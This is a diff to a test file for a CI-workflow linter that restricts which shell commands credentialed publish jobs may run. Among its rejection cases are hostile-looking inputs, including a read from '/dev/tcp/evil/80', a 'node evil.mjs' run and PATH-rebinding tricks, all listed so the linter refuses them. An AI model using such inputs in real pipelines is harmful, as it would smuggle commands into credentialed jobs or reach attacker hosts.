@@ -795,7 +795,21 @@ const REASONS = {
 
 describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 review)", () => {
   const block = (cmd) => `      - run: |\n          ${cmd.replace(/\n/g, "\n          ")}`;
-  const inPublish = (cmd, opts) => run(swap(PUBLISH_STEP, block(cmd)), opts);
+  /**
+   * The settings these rows run under: publish-npm's environment may reach
+   * this repository (as goModuleTags' environment) and the mirror o/p, so a
+   * git row is judged on its own shape. The settings rules this bends report
+   * on the settings file, never as "a credentialed job", so accepts filter.
+   */
+  const reach = () => {
+    const s = settings();
+    s.goModuleTags = { include: ["refs/tags/apps/g/v*"], environment: "sdk-publish-npm" };
+    s.mirrors = [{ repository: "o/p", unit: "p", environment: "sdk-publish-npm", tags: [] }];
+    return s;
+  };
+  const inPublish = (cmd, opts = {}) =>
+    run(swap(PUBLISH_STEP, block(cmd)), { s: reach(), ...opts });
+  const credOnly = (got) => got.filter((w) => CRED.test(w));
   const CRED = /a credentialed job/;
   const PUSH = "git push --atomic --end-of-options";
   it.each([
@@ -857,7 +871,7 @@ describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 r
     ["a function defined in a skipped branch", "false && python3() { :; }; python3 x.py"],
     // Round 3: variables bound without NAME=.
     ["local", "local PATH=x"],
-    ["read", "read PATH < x"],
+    ["read", "read PATH < publish-tmp/x"],
     ["printf -v", "printf -v PATH '%s' x"],
     ["for … in", "for PATH in x; do :; done"],
     ["for without in", "set -- a; for x do node evil.mjs; done"],
@@ -963,6 +977,12 @@ describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 r
     ],
     ["a .. in a redirection", "echo x > publish-tmp/../apps/x", /a literal path/],
     [
+      "input from a device",
+      "sort < /dev/tcp/evil/80",
+      /reads input only from publish-tmp\/, release\/ or dist\//,
+    ],
+    ["input from the checkout", "sort < apps/cli/install.sh", /reads input only from/],
+    [
       "a git global option other than --git-dir",
       "git --exec-path=x init --quiet --bare publish-tmp/m.git",
       /global option/,
@@ -1012,17 +1032,29 @@ git --git-dir=publish-tmp/mirror.git rev-parse refs/heads/main > publish-tmp/got
       "the NuGet upload",
       'dotnet nuget push "./release/x.nupkg" --api-key "$NUGET_API_KEY" --source https://api.nuget.org/v3/index.json',
     ],
-  ])("accepts %s", (_, cmd) => expect(inPublish(cmd)).toEqual([]));
+  ])("accepts %s", (_, cmd) => expect(credOnly(inPublish(cmd))).toEqual([]));
 
   it("accepts a mirror push to the repository the settings name, and only there", () => {
-    const { m, s } = withMirrors();
-    const push = (repo) =>
+    const push = (repo, s) =>
       inPublish(
         `git --git-dir=publish-tmp/mirror.git ${PUSH.slice(4)} git@github.com:${repo}.git refs/heads/main:refs/heads/main "refs/heads/main:refs/tags/\${MIRROR_TAG}"`,
-        { m, s },
+        s === undefined ? {} : { s },
       );
-    expect(push("o/p")).toEqual([]);
+    expect(credOnly(push("o/p"))).toEqual([]);
     fires(push("o/other"), /the remote must be a literal URL/);
+    // Each literal from its own environment only: o/p declared for another
+    // environment, or this repository without goModuleTags here, is refused.
+    const elsewhere = reach();
+    elsewhere.mirrors[0].environment = "sdk-publish-packagist";
+    fires(push("o/p", elsewhere), /the remote must be a literal URL/);
+    const noGo = reach();
+    delete noGo.goModuleTags;
+    fires(
+      inPublish(`${PUSH} git@github.com:confeature/sdks.git "HEAD:refs/tags/\${RELEASE_TAG}"`, {
+        s: noGo,
+      }),
+      /the remote must be a literal URL/,
+    );
   });
 
   it("joins a backslash continuation the way bash does, so an exception still matches", () => {
